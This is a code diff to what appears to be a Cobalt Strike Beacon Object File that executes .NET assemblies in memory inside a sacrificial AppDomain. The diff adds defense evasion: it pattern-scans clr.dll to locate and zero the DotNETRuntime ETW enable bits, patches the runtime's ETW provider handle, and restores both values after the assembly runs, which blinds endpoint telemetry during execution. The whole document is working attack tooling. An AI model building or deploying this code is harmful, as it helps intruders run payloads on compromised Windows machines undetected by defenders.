@@ -31,7 +31,7 @@ typedef struct _CLRContext {
     ICLRRuntimeInfo* pRuntimeInfo;
     ICorRuntimeHost* pCorRuntimeHost;
     IUnknown* pAppDomainThunk;
-    AppDomain* pDefaultAppDomain;
+    AppDomain* pSacrifcialAppDomain;
     Assembly* pAssembly;
     MethodInfo* pMethodInfo;
 } CLRContext;
@@ -271,13 +271,13 @@ static BOOL createAppDomain(HMODULE kernel32Base, CLRContext* ctx, HANDLE hOrigi
     _SetStdHandle pSetStdHandle = (_SetStdHandle)getProcAddr(kernel32Base, "SetStdHandle");
 
     HRESULT hr;
-    hr = ctx->pCorRuntimeHost->lpVtbl->CreateDomain(ctx->pCorRuntimeHost, (LPCWSTR)L"placeholder_domain", NULL, &ctx->pAppDomainThunk);
+    hr = ctx->pCorRuntimeHost->lpVtbl->CreateDomain(ctx->pCorRuntimeHost, (LPCWSTR)L"PlaceholderDoman", NULL, &ctx->pAppDomainThunk);
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] CreateDomain failed: 0x%08x\n", hr);
         return FALSE;
     }
     
-    hr = ctx->pAppDomainThunk->lpVtbl->QueryInterface(ctx->pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx->pDefaultAppDomain);
+    hr = ctx->pAppDomainThunk->lpVtbl->QueryInterface(ctx->pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx->pSacrifcialAppDomain);
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] QueryInterface for AppDomain failed: 0x%08x\n", hr);
         return FALSE;
@@ -320,7 +320,7 @@ static BOOL loadAssembly(HMODULE kernel32Base, unsigned char* assemblyBytes, siz
         return FALSE;
     }
     
-    hr = ctx->pDefaultAppDomain->lpVtbl->Load_3(ctx->pDefaultAppDomain, pSafeArray, &ctx->pAssembly);
+    hr = ctx->pSacrifcialAppDomain->lpVtbl->Load_3(ctx->pSacrifcialAppDomain, pSafeArray, &ctx->pAssembly);
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Load_3 failed: 0x%08x\n", hr);
         OLEAUT32$SafeArrayDestroy(pSafeArray);
@@ -434,17 +434,22 @@ static void cleanupCLR(HMODULE kernel32Base, CLRContext* ctx) {
         ctx->pAssembly->lpVtbl->Release(ctx->pAssembly);
         ctx->pAssembly = NULL;
     }
+
+    // unloads SacrifcialAppDomain
+    if (ctx->pCorRuntimeHost && ctx->pSacrifcialAppDomain) {
+        ctx->pCorRuntimeHost->lpVtbl->UnloadDomain(ctx->pCorRuntimeHost, (IUnknown *)(ctx->pSacrifcialAppDomain));
+    } 
     
-    if (ctx->pDefaultAppDomain) {
-        ctx->pDefaultAppDomain->lpVtbl->Release(ctx->pDefaultAppDomain);
-        ctx->pDefaultAppDomain = NULL;
+    if (ctx->pSacrifcialAppDomain) {
+        ctx->pSacrifcialAppDomain->lpVtbl->Release(ctx->pSacrifcialAppDomain);
+        ctx->pSacrifcialAppDomain = NULL;
     }
     
     if (ctx->pAppDomainThunk) {
         ctx->pAppDomainThunk->lpVtbl->Release(ctx->pAppDomainThunk);
         ctx->pAppDomainThunk = NULL;
     }
-    
+
     if (ctx->pCorRuntimeHost) {
         ctx->pCorRuntimeHost->lpVtbl->Stop(ctx->pCorRuntimeHost);
         ctx->pCorRuntimeHost->lpVtbl->Release(ctx->pCorRuntimeHost);
@@ -460,7 +465,7 @@ static void cleanupCLR(HMODULE kernel32Base, CLRContext* ctx) {
         ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
         ctx->pClrMetaHost = NULL;
     }
-    
+
     _FreeConsole pFreeConsole = (_FreeConsole)getProcAddr(kernel32Base, "FreeConsole");
     pFreeConsole();
 
@@ -534,6 +539,57 @@ int isEtwFunc(unsigned char* funcAddr, void* etwEventWrite) {
     return 1;
 }
 
+int* findDotNETRuntimeEnableBits() {
+    void* clrBase = getImageBase(L"clr.dll");
+    int clrSize = getImageSize(clrBase);
+
+    // assuming a max of 20 global variables that match the pattern
+    int MAX = 20;
+    int* globalVars[20] = { 0 };
+    int globalVarCounts[20] = { 0 };
+
+    for (int i = 0; i < clrSize; i++) {
+        unsigned char* addr = (unsigned char*)clrBase + i;
+
+        // matching "test cs:Microsoft_Windows_DotNETRuntimeEnableBits, 80000000h"
+        if (addr[0] != 0xf7 || addr[1] != 0x5) {
+            continue;
+        }
+
+        if (*(DWORD*)(addr + 6) != 0x80000000) {
+            continue;
+        }
+
+        // calculating global var address
+        unsigned char* rip = addr + 10;
+        int offset = *(DWORD*)(addr + 2);
+        int* globalVarAddr = (int*)(rip + offset);
+
+        // storing frequency of potential vars that could be Microsoft_Windows_DotNETRuntimeEnableBits
+        for (int i = 0; i < MAX; i ++) {
+            if (globalVars[i] == 0) {
+                globalVars[i] = globalVarAddr;
+                globalVarCounts[i] = 1;
+                break;
+            }
+
+            if (globalVars[i] == globalVarAddr) {
+                globalVarCounts[i] += 1;
+            }
+        }
+    }
+
+    // return the most frequent var - that would be Microsoft_Windows_DotNETRuntimeEnableBits
+    int mostFreq = 0;
+    for (int i = 1; i < MAX; i ++) {
+        if (globalVarCounts[mostFreq] < globalVarCounts[i]) {
+            mostFreq = i;
+        }
+    }
+
+    return globalVars[mostFreq];
+}
+
 int* findDotNetRuntimeHandle() {
     void* clrBase = getImageBase(L"clr.dll");
     int clrSize = getImageSize(clrBase);
@@ -592,13 +648,22 @@ int* findDotNetRuntimeHandle() {
     return handles[mostFreq];
 }
 
-void turnOffEtw(int* handleAddr, int* handleVal) {
+void turnOffEtwHandle(int* handleAddr, int* handleVal) {
     *handleVal = *handleAddr;
     *handleAddr = 1;
 }
 
-void turnOnEtw(int* handleAddr, int handleVal) {
+void turnOnEtwHandle(int* handleAddr, int handleVal) {
     *handleAddr = handleVal;
+}
+
+void turnOffEtwEnableBits(int* enableBitsAddr, int* enableBitsVal) {
+    *enableBitsVal = *enableBitsAddr;
+    *enableBitsAddr = 0;
+}
+
+void turnOnEtwEnableBits(int* enableBitsAddr, int enableBitsVal) {
+    *enableBitsAddr = enableBitsVal;
 }
 
 void go(char *args, int len) {
@@ -608,7 +673,8 @@ void go(char *args, int len) {
     unsigned char* assemblyBytes = BeaconDataExtract(&parser, NULL);
     size_t assemblyLength = BeaconDataInt(&parser);
     char* assemblyArgs = BeaconDataExtract(&parser, NULL);
-    size_t patchEtw = BeaconDataInt(&parser);
+    size_t patchEtwHandle = BeaconDataInt(&parser);
+    size_t patchEtwEnableBits = BeaconDataInt(&parser);
     size_t verbose = BeaconDataInt(&parser);
 
     if (assemblyLength == 0) {
@@ -628,17 +694,34 @@ void go(char *args, int len) {
         return;
     }
 
-    // null handleAddr
-    int* handleAddr = findDotNetRuntimeHandle();
+    // provider handle patching
+    int* handleAddr; 
     int handleVal;
-    if (patchEtw) {
-        turnOffEtw(handleAddr, &handleVal);
+    if (patchEtwHandle) {
+        handleAddr = findDotNetRuntimeHandle();
+        turnOffEtwHandle(handleAddr, &handleVal);
+
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle address: %p\n", handleAddr);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle value: %x\n", handleVal);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle patched: %x\n", *handleAddr);
+        }
     }
 
-    if (patchEtw && verbose) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle address: %p\n", handleAddr);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle value: %p\n", handleVal);
+    
+    int* enableBitsAddr;
+    int enableBitsVal;
+    if (patchEtwEnableBits) {
+        enableBitsAddr = findDotNETRuntimeEnableBits();
+        turnOffEtwEnableBits(enableBitsAddr, &enableBitsVal);
+        
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits address: %p\n", enableBitsAddr);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits value: %x\n", enableBitsVal);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits patched: %x\n", *enableBitsAddr);
+        }
     }
+
 
     if (verbose) {
         HMODULE clrBase = getImageBase(L"clr.dll");
@@ -684,11 +767,6 @@ void go(char *args, int len) {
         return;
     }
 
-    // null handleAddr
-    if (patchEtw) {
-        turnOnEtw(handleAddr, handleVal);
-    }
-
     if (verbose) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Assembly executed, reading output...\n");
     }
@@ -700,12 +778,12 @@ void go(char *args, int len) {
     DWORD totalBytesRead = 0;
     char* returnData = readOutput(hReadPipe, &totalBytesRead);
     
+    // close read pipe
     _CloseHandle pCloseHandle = (_CloseHandle)getProcAddr(kernel32Base, "CloseHandle");
     pCloseHandle(hReadPipe);
 
     if (totalBytesRead > 0) {
         returnData[totalBytesRead] = '\0';
-        // BeaconPrintf(CALLBACK_OUTPUT, "\n=== Output (%d bytes) ===\n%s\n", totalBytesRead, returnData);
         BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", returnData);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] No output captured (%d bytes read)\n", totalBytesRead);
@@ -715,5 +793,18 @@ void go(char *args, int len) {
 
     cleanupCLR(kernel32Base, &ctx);
     restoreStd(kernel32Base, hOriginalStdout, hWritePipe);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done \n");
+
+    // restore handleAddr
+    if (patchEtwHandle) {
+        turnOnEtwHandle(handleAddr, handleVal);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle value restored: %x\n", *handleAddr);
+    }
+
+    // restore enable bits
+    if (patchEtwEnableBits) {
+        turnOnEtwEnableBits(enableBitsAddr, enableBitsVal);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits value restored: %x\n", *enableBitsAddr);
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done\n");
 }
